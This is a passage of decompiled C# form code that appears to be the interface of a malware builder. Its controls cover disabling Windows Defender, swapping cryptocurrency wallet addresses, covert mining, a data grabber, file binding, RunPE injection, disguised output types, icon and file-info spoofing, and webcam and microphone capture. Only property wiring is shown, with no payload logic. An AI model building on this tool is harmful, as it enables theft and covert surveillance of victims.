	public virtual Label Label79
	{
		[CompilerGenerated]
		get
		{
			return tdcucsJoPl;
		}
		[CompilerGenerated]
		set
		{
			tdcucsJoPl = value;
		}
	}

	internal virtual Guna2ToggleSwitch Disable_WD
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_34;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_34 = value;
		}
	}

	internal virtual Label Label80
	{
		[CompilerGenerated]
		get
		{
			return label_62;
		}
		[CompilerGenerated]
		set
		{
			label_62 = value;
		}
	}

	public virtual ContextMenuStrip Remove_List_Connection
	{
		[CompilerGenerated]
		get
		{
			return contextMenuStrip_2;
		}
		[CompilerGenerated]
		set
		{
			contextMenuStrip_2 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem19
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_51;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_97;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_51;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_51 = value;
			toolStripMenuItem = toolStripMenuItem_51;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem26
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_52;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_98;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_52;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_52 = value;
			toolStripMenuItem = toolStripMenuItem_52;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	public virtual ContextMenuStrip Remove_List_Kill
	{
		[CompilerGenerated]
		get
		{
			return contextMenuStrip_3;
		}
		[CompilerGenerated]
		set
		{
			contextMenuStrip_3 = value;
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem27
	{
		[CompilerGenerated]
		get
		{
			return qjButVfmuR;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_99;
			ToolStripMenuItem toolStripMenuItem = qjButVfmuR;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			qjButVfmuR = value;
			toolStripMenuItem = qjButVfmuR;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem28
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_53;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_100;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_53;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_53 = value;
			toolStripMenuItem = toolStripMenuItem_53;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel11
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_9;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_9 = value;
		}
	}

	public virtual PictureBox PictureBox70
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_59;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_59 = value;
		}
	}

	internal virtual Guna2TextBox ETH
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_8;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_8 = value;
		}
	}

	internal virtual Guna2TextBox GXMR
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_9;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_9 = value;
		}
	}

	internal virtual Guna2TextBox BTC
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_10;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_10 = value;
		}
	}

	internal virtual Guna2TextBox XLM
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_11;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_11 = value;
		}
	}

	internal virtual Guna2TextBox XRP
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_12;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_12 = value;
		}
	}

	internal virtual Guna2TextBox LTC
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_13;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_13 = value;
		}
	}

	internal virtual Guna2ToggleSwitch XMR
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_35;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_106;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_35;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_35 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_35;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual Label Label87
	{
		[CompilerGenerated]
		get
		{
			return label_63;
		}
		[CompilerGenerated]
		set
		{
			label_63 = value;
		}
	}

	public virtual Panel Panel36
	{
		[CompilerGenerated]
		get
		{
			return panel_27;
		}
		[CompilerGenerated]
		set
		{
			panel_27 = value;
		}
	}

	internal virtual Guna2TextBox Wallet_address
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_14;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_14 = value;
		}
	}

	internal virtual Guna2TextBox POOL
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_15;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_15 = value;
		}
	}

	public virtual PictureBox PictureBox72
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_60;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_60 = value;
		}
	}

	internal virtual Guna2ToggleSwitch NVIDIA
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_36;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_36 = value;
		}
	}

	internal virtual Label Label83
	{
		[CompilerGenerated]
		get
		{
			return label_64;
		}
		[CompilerGenerated]
		set
		{
			label_64 = value;
		}
	}

	internal virtual Label Label85
	{
		[CompilerGenerated]
		get
		{
			return label_65;
		}
		[CompilerGenerated]
		set
		{
			label_65 = value;
		}
	}

	public virtual PictureBox PictureBox74
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_61;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_61 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Grabber
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_37;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_107;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_37;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_37 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_37;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2ToggleSwitch CPU
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_38;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_38 = value;
		}
	}

	internal virtual Label Label86
	{
		[CompilerGenerated]
		get
		{
			return label_66;
		}
		[CompilerGenerated]
		set
		{
			label_66 = value;
		}
	}

	public virtual PictureBox PictureBox75
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_62;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_62 = value;
		}
	}

	public virtual Label Label89
	{
		[CompilerGenerated]
		get
		{
			return label_67;
		}
		[CompilerGenerated]
		set
		{
			label_67 = value;
		}
	}

	internal virtual Guna2ToggleSwitch AMD
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_39;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_39 = value;
		}
	}

	public virtual PictureBox PictureBox65
	{
		[CompilerGenerated]
		get
		{
			return bkNpwekXw0;
		}
		[CompilerGenerated]
		set
		{
			bkNpwekXw0 = value;
		}
	}

	internal virtual Guna2TextBox Proxy_Port
	{
		[CompilerGenerated]
		get
		{
			return ytOpyjdqmr;
		}
		[CompilerGenerated]
		set
		{
			ytOpyjdqmr = value;
		}
	}

	internal virtual Guna2ToggleSwitch Enable_Proxy
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_40;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_108;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_40;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_40 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_40;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label78
	{
		[CompilerGenerated]
		get
		{
			return label_68;
		}
		[CompilerGenerated]
		set
		{
			label_68 = value;
		}
	}

	internal virtual Guna2TextBox Proxy_Host
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_16;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_16 = value;
		}
	}

	internal virtual Guna2TextBox NEC
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_17;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_17 = value;
		}
	}

	public virtual PictureBox PictureBox73
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_63;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_63 = value;
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel8
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_10;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_10 = value;
		}
	}

	internal virtual RadioButton Loading
	{
		[CompilerGenerated]
		get
		{
			return radioButton_2;
		}
		[CompilerGenerated]
		set
		{
			radioButton_2 = value;
		}
	}

	internal virtual RadioButton RunPE
	{
		[CompilerGenerated]
		get
		{
			return radioButton_3;
		}
		[CompilerGenerated]
		set
		{
			radioButton_3 = value;
		}
	}

	public virtual PictureBox PictureBox71
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_64;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_64 = value;
		}
	}

	internal virtual Label Label81
	{
		[CompilerGenerated]
		get
		{
			return label_69;
		}
		[CompilerGenerated]
		set
		{
			label_69 = value;
		}
	}

	internal virtual Guna2TextBox Binder_Path
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_18;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_109;
			EventHandler value3 = method_133;
			Guna2TextBox guna2TextBox = guna2TextBox_18;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconRightClick -= value2;
				guna2TextBox.TextChanged -= value3;
			}
			guna2TextBox_18 = value;
			guna2TextBox = guna2TextBox_18;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconRightClick += value2;
				guna2TextBox.TextChanged += value3;
			}
		}
	}

	internal virtual Guna2ToggleSwitch Enable_Binder
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_41;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_110;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_41;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_41 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_41;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	public virtual PictureBox PictureBox76
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_65;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_65 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Binder_Run
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_42;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_42 = value;
		}
	}

	internal virtual Label Label82
	{
		[CompilerGenerated]
		get
		{
			return label_70;
		}
		[CompilerGenerated]
		set
		{
			label_70 = value;
		}
	}

	internal virtual Guna2ComboBox Binder_ComboBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_111;
			Guna2ComboBox guna2ComboBox = guna2ComboBox_0;
			if (guna2ComboBox != null)
			{
				guna2ComboBox.SelectedIndexChanged -= value2;
			}
			guna2ComboBox_0 = value;
			guna2ComboBox = guna2ComboBox_0;
			if (guna2ComboBox != null)
			{
				guna2ComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel13
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_11;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_11 = value;
		}
	}

	internal virtual Guna2GradientButton Add_icon
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_116;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientPanel Guna2GradientPanel12
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientPanel_12;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientPanel_12 = value;
		}
	}

	internal virtual Guna2GradientButton GeRan
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_113;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_2 = value;
			guna2GradientButton = guna2GradientButton_2;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Clone_F
	{
		[CompilerGenerated]
		get
		{
			return UuFpavoRyw;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_112;
			Guna2GradientButton uuFpavoRyw = UuFpavoRyw;
			if (uuFpavoRyw != null)
			{
				uuFpavoRyw.Click -= value2;
			}
			UuFpavoRyw = value;
			uuFpavoRyw = UuFpavoRyw;
			if (uuFpavoRyw != null)
			{
				uuFpavoRyw.Click += value2;
			}
		}
	}

	internal virtual Guna2TextBox As5
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_19;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_19 = value;
		}
	}

	internal virtual Guna2TextBox As4
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_20;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_20 = value;
		}
	}

	internal virtual Guna2TextBox As3
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_21;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_21 = value;
		}
	}

	internal virtual Guna2TextBox As2
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_22;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_22 = value;
		}
	}

	internal virtual Label Label88
	{
		[CompilerGenerated]
		get
		{
			return label_71;
		}
		[CompilerGenerated]
		set
		{
			label_71 = value;
		}
	}

	internal virtual Guna2TextBox As1
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_23;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_23 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Guna2ToggleSwitch2
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_43;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_114;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_43;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_43 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_43;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual Label Label84
	{
		[CompilerGenerated]
		get
		{
			return label_72;
		}
		[CompilerGenerated]
		set
		{
			label_72 = value;
		}
	}

	internal virtual Guna2ToggleSwitch Enable_icon
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_44;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_117;
			Guna2ToggleSwitch guna2ToggleSwitch = guna2ToggleSwitch_44;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged -= value2;
			}
			guna2ToggleSwitch_44 = value;
			guna2ToggleSwitch = guna2ToggleSwitch_44;
			if (guna2ToggleSwitch != null)
			{
				guna2ToggleSwitch.CheckedChanged += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox_icon
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_66;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_66 = value;
		}
	}

	internal virtual Guna2TextBox Path_icon
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_24;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_24 = value;
		}
	}

	internal virtual NumericUpDown num4
	{
		[CompilerGenerated]
		get
		{
			return numericUpDown_1;
		}
		[CompilerGenerated]
		set
		{
			numericUpDown_1 = value;
		}
	}

	internal virtual NumericUpDown num3
	{
		[CompilerGenerated]
		get
		{
			return numericUpDown_2;
		}
		[CompilerGenerated]
		set
		{
			numericUpDown_2 = value;
		}
	}

	internal virtual Label Label41
	{
		[CompilerGenerated]
		get
		{
			return label_73;
		}
		[CompilerGenerated]
		set
		{
			label_73 = value;
		}
	}

	internal virtual NumericUpDown num2
	{
		[CompilerGenerated]
		get
		{
			return numericUpDown_3;
		}
		[CompilerGenerated]
		set
		{
			numericUpDown_3 = value;
		}
	}

	internal virtual NumericUpDown num1
	{
		[CompilerGenerated]
		get
		{
			return numericUpDown_4;
		}
		[CompilerGenerated]
		set
		{
			numericUpDown_4 = value;
		}
	}

	public virtual Button Button10
	{
		[CompilerGenerated]
		get
		{
			return button_14;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_125;
			EventHandler value3 = method_128;
			Button button = button_14;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_14 = value;
			button = button_14;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Button9
	{
		[CompilerGenerated]
		get
		{
			return button_15;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_122;
			EventHandler value3 = method_127;
			Button button = button_15;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_15 = value;
			button = button_15;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Button8
	{
		[CompilerGenerated]
		get
		{
			return svfpdpqsyh;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_120;
			EventHandler value3 = method_126;
			Button button = svfpdpqsyh;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			svfpdpqsyh = value;
			button = svfpdpqsyh;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	internal virtual Panel Panel39
	{
		[CompilerGenerated]
		get
		{
			return tgeplwduEn;
		}
		[CompilerGenerated]
		set
		{
			tgeplwduEn = value;
		}
	}

	internal virtual Guna2ComboBox NETFRAMWORKS
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = oiusyiCdal;
			Guna2ComboBox guna2ComboBox = guna2ComboBox_1;
			if (guna2ComboBox != null)
			{
				guna2ComboBox.SelectedIndexChanged -= value2;
			}
			guna2ComboBox_1 = value;
			guna2ComboBox = guna2ComboBox_1;
			if (guna2ComboBox != null)
			{
				guna2ComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual Label Label90
	{
		[CompilerGenerated]
		get
		{
			return label_74;
		}
		[CompilerGenerated]
		set
		{
			label_74 = value;
		}
	}

	internal virtual Panel Panel38
	{
		[CompilerGenerated]
		get
		{
			return panel_28;
		}
		[CompilerGenerated]
		set
		{
			panel_28 = value;
		}
	}

	public virtual PictureBox PictureBox83
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_67;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_67 = value;
		}
	}

	internal virtual Guna2RadioButton CMD
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_11;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_11 = value;
		}
	}

	public virtual PictureBox PictureBox84
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_68;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_68 = value;
		}
	}

	internal virtual Guna2RadioButton BAT
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_12;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_12 = value;
		}
	}

	public virtual PictureBox PictureBox85
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_69;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_69 = value;
		}
	}

	internal virtual Guna2RadioButton PIF
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_13;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_13 = value;
		}
	}

	public virtual PictureBox PictureBox82
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_70;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_70 = value;
		}
	}

	internal virtual Guna2RadioButton COM
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_14;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_14 = value;
		}
	}

	public virtual PictureBox PictureBox81
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_71;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_71 = value;
		}
	}

	internal virtual Guna2RadioButton SCR
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_15;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_15 = value;
		}
	}

	internal virtual Label Label60
	{
		[CompilerGenerated]
		get
		{
			return label_75;
		}
		[CompilerGenerated]
		set
		{
			label_75 = value;
		}
	}

	public virtual PictureBox PictureBox80
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_72;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_72 = value;
		}
	}

	internal virtual Guna2RadioButton EXE
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_16;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_16 = value;
		}
	}

	internal virtual Panel Panel37
	{
		[CompilerGenerated]
		get
		{
			return panel_29;
		}
		[CompilerGenerated]
		set
		{
			panel_29 = value;
		}
	}

	public virtual PictureBox PictureBox78
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_73;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_73 = value;
		}
	}

	internal virtual Guna2ToggleSwitch MMinings
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_45;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_45 = value;
		}
	}

	internal virtual Label Label56
	{
		[CompilerGenerated]
		get
		{
			return label_76;
		}
		[CompilerGenerated]
		set
		{
			label_76 = value;
		}
	}

	public virtual PictureBox PictureBox79
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_74;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_74 = value;
		}
	}

	protected virtual Label Label59
	{
		[CompilerGenerated]
		get
		{
			return label_77;
		}
		[CompilerGenerated]
		set
		{
			label_77 = value;
		}
	}

	internal virtual Guna2ToggleSwitch MPASSZ
	{
		[CompilerGenerated]
		get
		{
			return guna2ToggleSwitch_46;
		}
		[CompilerGenerated]
		set
		{
			guna2ToggleSwitch_46 = value;
		}
	}

	internal virtual Panel Panel35
	{
		[CompilerGenerated]
		get
		{
			return panel_30;
		}
		[CompilerGenerated]
		set
		{
			panel_30 = value;
		}
	}

	internal virtual TabPage Logs
	{
		[CompilerGenerated]
		get
		{
			return tabPage_11;
		}
		[CompilerGenerated]
		set
		{
			tabPage_11 = value;
		}
	}

	internal virtual TabPage Settings
	{
		[CompilerGenerated]
		get
		{
			return tabPage_12;
		}
		[CompilerGenerated]
		set
		{
			tabPage_12 = value;
		}
	}

	public virtual Panel Panel27
	{
		[CompilerGenerated]
		get
		{
			return panel_31;
		}
		[CompilerGenerated]
		set
		{
			panel_31 = value;
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton2
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_3;
		}
		[CompilerGenerated]
		set
		{
			guna2GradientButton_3 = value;
		}
	}

	public virtual PictureBox PictureBox25
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_75;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_75 = value;
		}
	}

	internal virtual Guna2ComboBox scrI
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_2;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_2 = value;
		}
	}

	public virtual Label Label39
	{
		[CompilerGenerated]
		get
		{
			return label_78;
		}
		[CompilerGenerated]
		set
		{
			label_78 = value;
		}
	}

	internal virtual Guna2CheckBox ShowAlert
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_0 = value;
		}
	}

	internal virtual Guna2CheckBox LOGLERR
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_1;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_1 = value;
		}
	}

	internal virtual Guna2CheckBox LOGMSGS
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_2;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_2 = value;
		}
	}

	internal virtual Guna2CheckBox LOGRERR
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_3;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_3 = value;
		}
	}

	internal virtual Guna2CheckBox LOGCONNECTIONS
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_4;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_4 = value;
		}
	}

	internal virtual Guna2CheckBox LOGLOGIN
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_5;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_5 = value;
		}
	}

	public virtual Panel Panel25
	{
		[CompilerGenerated]
		get
		{
			return panel_32;
		}
		[CompilerGenerated]
		set
		{
			panel_32 = value;
		}
	}

	internal virtual Guna2CheckBox MICAUT
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_6;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_6 = value;
		}
	}

	public virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_76;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_76 = value;
		}
	}

	internal virtual Guna2ComboBox MICI
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_3;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_3 = value;
		}
	}

	public virtual Label Label36
	{
		[CompilerGenerated]
		get
		{
			return label_79;
		}
		[CompilerGenerated]
		set
		{
			label_79 = value;
		}
	}

	public virtual Panel Panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_33;
		}
		[CompilerGenerated]
		set
		{
			panel_33 = value;
		}
	}

	internal virtual Guna2CheckBox CAMAUT
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_7;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_7 = value;
		}
	}

	public virtual PictureBox PictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_77;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_77 = value;
		}
	}

	internal virtual Guna2ComboBox CAMI
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_4;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_4 = value;
		}
	}

	public virtual Label Label35
	{
		[CompilerGenerated]
		get
		{
			return label_80;
		}
		[CompilerGenerated]
		set
		{
			label_80 = value;
		}
	}

	public virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return panel_34;
		}
		[CompilerGenerated]
		set
		{
			panel_34 = value;
		}
	}

	internal virtual Guna2CheckBox SCAUT
	{
		[CompilerGenerated]
		get
		{
			return guna2CheckBox_8;
		}
		[CompilerGenerated]
		set
		{
			guna2CheckBox_8 = value;
		}
	}

	public virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_78;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_78 = value;
		}
	}

	internal virtual Guna2ComboBox SCI
	{
		[CompilerGenerated]
		get
		{
			return guna2ComboBox_5;
		}
		[CompilerGenerated]
		set
		{
			guna2ComboBox_5 = value;
		}
	}

	public virtual Label Label34
	{
		[CompilerGenerated]
		get
		{
			return label_81;
		}
		[CompilerGenerated]
		set
		{
			label_81 = value;
		}
	}

	internal virtual TabPage Abouts
	{
		[CompilerGenerated]
		get
		{
			return tabPage_13;
		}
		[CompilerGenerated]
		set
		{
			tabPage_13 = value;
		}
	}

	internal virtual Guna2Button NOTF_L1_Miner
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_12;
		}
		[CompilerGenerated]
		set
		{
